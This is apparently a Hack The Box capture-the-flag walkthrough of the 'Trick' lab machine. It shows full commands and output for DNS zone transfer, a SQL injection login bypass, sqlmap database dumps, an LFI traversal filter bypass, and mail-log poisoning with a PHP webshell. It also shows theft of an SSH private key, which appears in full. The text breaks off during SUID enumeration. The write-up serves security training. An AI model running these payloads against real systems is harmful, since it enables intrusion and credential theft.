![Trick](https://labs.hackthebox.com/storage/avatars/ca56ef43d636aff7da48a8b484756cfe.png)


- Machine : https://app.hackthebox.com/machines/Trick
- Reference : https://youtu.be/H9FcE_FMZio?si=7dOih6GEVsMYjLO3
- Solved : 2024.11.25. (Mon) (Takes 1day)
 
### Summary
---


# External Penetration Testing
---
## External Information Gathering
### Port Scanning
---
```bash
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.10.11.166
Performing quick port scan on 10.10.11.166...
Found open ports: 22,25,53,80,8973
Performing detailed scan on 10.10.11.166...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 05:24 EST
Nmap scan report for 10.10.11.166
Host is up (0.13s latency).

PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp   open   smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp   open   domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp   open   http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
8973/tcp closed unknown
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.23 seconds
```

The port scanning found 4 open ports : 22,25,53,80.
While it contains DNS(53) port, but it doesn't reveal domain name.
Maybe reverse DNS lookup might be helpful to find domain name.
Also, http(80) is supposed to be visited ahead of other services.



### dns(53)
---
First, we can perform reverse DNS lookup.

```bash
┌──(kali㉿kali)-[~/htb/CVE-2024-34833-payroll-management-system-rce]
└─$ dig @10.10.11.166 -x 10.10.11.166

; <<>> DiG 9.20.0-Debian <<>> @10.10.11.166 -x 10.10.11.166
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 30793
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: aacdc5b983e9b55e8be1e0b76744ae8c0ca16e5b4494e00e (good)
;; QUESTION SECTION:
;166.11.10.10.in-addr.arpa.     IN      PTR

;; ANSWER SECTION:
166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.

;; AUTHORITY SECTION:
11.10.10.in-addr.arpa.  604800  IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 139 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
;; WHEN: Mon Nov 25 12:06:17 EST 2024
;; MSG SIZE  rcvd: 163
```

`trick.htb` found. Let's list it to `/etc/hosts`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ cat /etc/hosts                              
10.10.11.166    trick.htb preprod-payroll.trick.htb root.trick.htb
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Plus, let's try Zone Transfer to the DNS server.

```bash
┌──(kali㉿kali)-[~/htb/CVE-2024-34833-payroll-management-system-rce]
└─$ dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.20.0-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 131 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Mon Nov 25 12:08:21 EST 2024
;; XFR size: 6 records (messages 1, bytes 231)
```

`preprod-payroll.trick.htb` and `root.trick.htb` are additionally found.



### http(80)
---
Index Page shows that the website is under construction. There's an input for email, but it's not working. Its source code contains has some codes regarding bootstrap only.

![trick_1](.
/attachments/trick_1.png)

Let's run `gobuster` to find if there is any sub pages.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir -u http://trick.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://trick.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 185] [--> http://trick.htb/assets/]                                                                        
/css                  (Status: 301) [Size: 185] [--> http://trick.htb/css/]
/js                   (Status: 301) [Size: 185] [--> http://trick.htb/js/]
Progress: 13906 / 220561 (6.30%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 13939 / 220561 (6.32%)
===============================================================
Finished
===============================================================
```

Only generic pages (such as `/assets`, `css`, `/js`) are found.
Let's try to visit another domain : `preprod-payroll.trick.htb`.

![trick_2](./attachments/trick_2.png)

Also, let's run `gobuster` again to find sub pages.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir -u http://preprod-payroll.trick.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://preprod-payroll.trick.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/assets/]                                                        
/database             (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/database/]     
```

The name of the software running is `Payroll Management System`



## Exploitation
### SQL Injection
---
Let's try a simple SQL Injection on Login Input. I'll feed a default SQLi input `admin' OR 1=1-- -` on username, and put whatever string on password.

![trick_3](./attachments/trick_3.png)

After trying the standard basic SQL injections, we find that using `admin' or 1=1 --`  as the username and anything as the password works!

![trick_4](./attachments/trick_4.png)
![trick_5](./attachments/trick_5.png)

"Users" tab on the admin panel provides a function to edit user's properties including password.

```html
<input type="password" name="password" id="password" class="form-control" value="SuperGucciRainbowCake" required="">
```
With developer tool, I could read the plain text of the admin user `Enemigosss` password : `SuperGucciRainbowCake`

To enumerate its database, let's try using `sqlmap`.
First, using `Burpsuite` I captured and saved the login request.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ cat req.txt   
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42
Origin: http://preprod-payroll.trick.htb
Connection: keep-alive
Referer: http://preprod-payroll.trick.htb/login.php
Cookie: PHPSESSID=pl6dk0mbm0ksc1bl3l8atu2m62

username=*&password=test
```

Using the request file, I tried naive `sqlmap` command.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r req.txt --batch --dbs
       __H__                                
 ___ ___[(]_____ ___ ___  {1.8.7#stable}
|_ -| . [)]     | .'| . |       
|___|_  [)]_|_|_|__,|  _|    
      |_|V...       |_|   https://sqlmap.org   

<SNIP>

sqlmap identified the following injection point(s) with a total of 212 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 8151 FROM (SELECT(SLEEP(5)))WJeT) AND 'UVZo'='UVZo&password=test
---
[13:50:08] [INFO] the back-end DBMS is MySQL

<SNIP>
```

This scan is using "Time-based SQL Injection" which takes too long.
Let's specify the increase thread.

```yaml
┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r req.txt --batch --threads 10 --dbs 

<SNIP>

[14:04:38] [INFO] resumed: 2
[14:04:38] [INFO] resumed: information_schema
[14:04:38] [INFO] resumed: payroll_db
available databases [2]:
[*] information_schema
[*] payroll_db
```

There are two DBs including default(information_schema). We need to investigate on `payroll_db`.
Let's try to fetch tables this time.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r req.txt --batch --threads 10 -D payroll_db --tables

<SNIP>

[14:07:30] [INFO] adjusting time delay to 2 seconds due to good response times
position
[14:08:36] [INFO] retrieved: employee
[14:09:39] [INFO] retrieved: depart
[14:10:33] [ERROR] invalid character detected. retrying..
[14:10:33] [WARNING] increasing time delay to 3 seconds
ment
[14:11:17] [INFO] retrieved: payroll_items
[14:13:52] [INFO] retrieved: attendance
[14:15:29] [INFO] retrieved: employee_deductions
[14:19:02] [INFO] retrieved: employee_allowances
[14:21:14] [INFO] retrieved: users
[14:22:06] [INFO] retrieved: deductions
[14:23:51] [INFO] retrieved: 
[14:24:02] [ERROR] invalid character detected. retrying..
[14:24:02] [WARNING] increasing time delay to 4 seconds
payroll
[14:25:51] [INFO] retrieved: allowances
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
```

Next, let's dump the `Users` table. With `--dump` option, I can dump the whole contents from the table.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r req.txt --batch --threads 10 -D payroll_db -T users --dump

<SNIP>

Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type   | address | contact | password              | username   |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1      | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
```

Current user & Privileges of the current user

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r req.txt --batch --threads 10 --current-user 

<SNIP>
remo@localhost
current user: 'remo@localhost'
[23:01:09] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'  


┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r req.txt --batch --threads 10 --privileges 

<SNIP>

database management system users privileges:
[*] %remo% [1]:
    privilege: FILE

[22:57:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'   
```

There's a hint that nginx has a default file name where sites are configured.
Based on research, the path to the configuration file is `/etc/nginx/nginx.conf`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r req.txt --batch --threads 10 --file-read=/etc/nginx/nginx.conf
<SNIP>
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf (size differs from remote file)

┌──(kali㉿kali)-[~/…/sqlmap/output/preprod-payroll.trick.htb/files]
└─$ cat _etc_nginx_sites-enabled_default 
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name trick.h?

┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r req.txt --batch --threads 10 --file-read=/etc/nginx/sites-enabled/default
<SNIP>
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default (size differs from remote file)

┌──(kali㉿kali)-[~/htb]
└─$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name trick.h? 
```

The extracted `nginx.conf` is somewhat trimmed, not showing the whole content..



### Local File Inclusion
---
While enumerating through the website, I can find that the URL contains `page=` parameter with included file name, like;

`http://preprod-marketing.trick.htb/index.php?page=contact.html`

My first guess is that this might be vulnerable to Path Traversal and Local File Inclusion.
In that case, I can read files outside of the webroot.
However, naive LFI like `page=../../../../../etc/passwd` is not working.
Then, I can try two methods;
- LFI considering regex filter : `http://preprod-payroll.trick.htb/index.php?page=....//....//....//etc/passwd`
- PHP filter : `http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd`
However, I'm not sure if regex filter bypass method is working this time since I can't read `nginx.conf` file. Let's try PHP filter method.

The php filter method is working;

![](attachments/trick_6.png)

It's working! It's successfully retrieving the `home` content.

With `curl` and `grep`, I can extract the base64 encoded strings from now on.

```php-template
┌──(kali㉿kali)-[~/htb]
└─$ curl -s 'preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home' | grep -A 1 '<main id="view-panel" >' | grep -v main | perl -pe 's/^\s+|\s+$//g'
PD9waHAgaW5jbHVkZSAnZGJfY29ubmVjdC5waHAnID8+DQo8c3R5bGU+DQogICANCjwvc3R5bGU+DQoNCjxkaXYgY2xhc3M9ImNvbnRhaW5lLWZsdWlkIj4NCg0KCTxkaXYgY2xhc3M9InJvdyI+DQoJCTxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+DQoJCQkNCgkJPC9kaXY+DQoJPC9kaXY+DQoNCgk8ZGl2IGNsYXNzPSJyb3cgbXQtMyBtbC0zIG1yLTMiPg0KCQkJPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyAiV2VsY29tZSBiYWNrICIuICRfU0VTU0lPTlsnbG9naW5fbmFtZSddLiIhIiAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoJPC9kaXY+DQoNCjwvZGl2Pg0KPHNjcmlwdD4NCgkNCjwvc2NyaXB0Pg==                                                                            
┌──(kali㉿kali)-[~/htb]
└─$ curl -s 'preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home' | grep -A 1 '<main id="view-panel" >' | grep -v main | perl -pe 's/^\s+|\s+$//g' | base64 -d
<?php include 'db_connect.php' ?>
<style>
   
</style>

<div class="containe-fluid">

        <div class="row">
                <div class="col-lg-12">

                </div>
        </div>

        <div class="row mt-3 ml-3 mr-3">
                        <div class="col-lg-12">
                <div class="card">
                    <div class="card-body">
                    <?php echo "Welcome back ". $_SESSION['login_name']."!"  ?>
                                        
                    </div>
                    
                </div>
            </div>
        </div>

</div>
<script>

</script>             
```

Based on the source code, it's running on PHP. So, we can expect that the backend append `.php` at the end of the URL we are feeding.
Plus, the code above shows that there's `db_connect.php` file included which might contains some DB credentials. Let's open it as well.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ curl -s 'preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=db_connect' | grep -A 1 '<main id="view-panel" >' | grep -v main | perl -pe 's/^\s+|\s+$//g' | base64 -d
<?php 

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```

From `db_connect.php`, I can find DB credential `remo` : `TrulyImpossiblePasswordLmao123`.
Let me try this to `ssh` just in case if it's using the same password.

```perl
┌──(kali㉿kali)-[~/htb]
└─$ ssh remo@10.10.11.166
remo@10.10.11.166's password: 
Permission denied, please try again.
remo@10.10.11.166's password: 
```

Unluckily, it's not working on `ssh`...
Additionally I can scan with `ffuf` to find all existing vHost with its naming convention.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://10.10.11.166 -H 'Host: preprod-FUZZ.trick.htb' -fs 5480 -s 
marketing
payroll
```

`preprod-marketing.trick.htb` is additionally found. Let's add this to `/etc/hosts`.
Then, let's visit the vHost.

![trick_7](attachments/trick_7.png)

While enumerating through the website, I can find that the URL contains `page=` parameter with included file name, like;

`http://preprod-marketing.trick.htb/index.php?page=contact.html`

My first guess is that this might be vulnerable to Path Traversal and Local File Inclusion.
In that case, I can read files outside of the webroot.
However, naive LFI like `page=../../../../../etc/passwd` is not working.
Then, I can try two methods;
- LFI considering regex filter : `http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd`
- PHP filter : `http://preprod-marketing.trick.htb/index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd`

At this time, php filter is not working but the path traversal working.

![](attachments/trick_8.png)
```bash
┌──(kali㉿kali)-[~/htb]
└─$ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

From the `/etc/passwd` file, I could find other user accounts including `michael` at the end.
Let me check if the user named `michael` exists in mail process.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ telnet 10.10.11.166 25
Trying 10.10.11.166...
Connected to 10.10.11.166.
Escape character is '^]'.
VRFY michael
220 debian.localdomain ESMTP Postfix (Debian/GNU)
252 2.0.0 michael
```

Since the user exists, we can guess that there must be `/usr/mail/michael` for storing `michael`'s mail. Let's send a mail to it and check.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ swaks --to michael --from bokchee --header "Subject: Testing" --body "ignore this message" --server 10.10.11.166          
=== Trying 10.10.11.166:25...
=== Connected to 10.10.11.166.
<-  220 debian.localdomain ESMTP Postfix (Debian/GNU)
 -> EHLO kali
<-  250-debian.localdomain
<SNIP>
 -> Date: Tue, 26 Nov 2024 03:36:42 -0500
 -> To: michael
 -> From: bokchee
 -> Subject: Testing
 -> Message-Id: <20241126033642.362755@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> ignore this message
 -> .
<-  250 2.0.0 Ok: queued as 1C3F84099C
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

And now, let's check if the michael is getting the mail.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/mail/michael
From bokchee@debian.localdomain  Tue Nov 26 09:36:53 2024
Return-Path: <bokchee@debian.localdomain>
X-Original-To: michael
Delivered-To: michael@debian.localdomain
Received: from kali (unknown [10.10.14.14])
        by debian.localdomain (Postfix) with ESMTP id 1C3F84099C
        for <michael>; Tue, 26 Nov 2024 09:36:52 +0100 (CET)
Date: Tue, 26 Nov 2024 03:36:42 -0500
To: michael
From: bokchee
Subject: Testing
Message-Id: <20241126033642.362755@kali>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/

ignore this message
```

It's working!
Now let's send another mail with php webshell.

```php-template
┌──(kali㉿kali)-[~/htb]
└─$ swaks --to michael --from bokchee --header "Subject: Webshell" --body '<?php system($_REQUEST["cmd"]); ?>' --server 10.10.11.166
=== Trying 10.10.11.166:25...
=== Connected to 10.10.11.166.
<-  220 debian.localdomain ESMTP Postfix (Debian/GNU)
 -> EHLO kali
<-  250-debian.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<bokchee>
<-  250 2.1.0 Ok
 -> RCPT TO:<michael>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Tue, 26 Nov 2024 03:51:27 -0500
 -> To: michael
 -> From: bokchee
 -> Subject: Webshell
 -> Message-Id: <20241126035127.370056@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> <?php system($_REQUEST["cmd"]); ?>
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 804664099C
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

I can use `curl` to the URL with `&cmd=` param.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ curl 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/mail/michael&cmd=id'
From bokchee@debian.localdomain  Tue Nov 26 09:51:38 2024
Return-Path: <bokchee@debian.localdomain>
X-Original-To: michael
Delivered-To: michael@debian.localdomain
Received: from kali (unknown [10.10.14.14])
        by debian.localdomain (Postfix) with ESMTP id 804664099C
        for <michael>; Tue, 26 Nov 2024 09:51:38 +0100 (CET)
Date: Tue, 26 Nov 2024 03:51:27 -0500
To: michael
From: bokchee
Subject: Webshell
Message-Id: <20241126035127.370056@kali>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/

uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

It's working. Now I can open a reverse shell through this.
To run it, you have to send the mail again though.

...

I tried several times switching from browser to `curl` command, also encoding into URL format..
But I think it's not working well..
Instead, let's read `id_rsa` file if it exists. It's doable since we are capable of reading server files with `michael`'s permission.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ curl 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Let's save this private key and try to login as `michael` through `ssh`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ chmod 600 michael_id_rsa.priv 
                                                              
┌──(kali㉿kali)-[~/htb]
└─$ ssh -i michael_id_rsa.priv michael@10.10.11.166
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

Now I have the `michael`'s shell!



---
# Internal Penetration Testing
## Enumeration
### Manual Enumeration
---

First let's start with `SUID` permission.

```bash
michael@trick:~$ find / -perm -4000 2>/dev/null
/usr/sbin/pppd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/bwrap
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/ntfs-3g
/usr/bin/umount
/usr/bin/passwd
/usr/bin/su
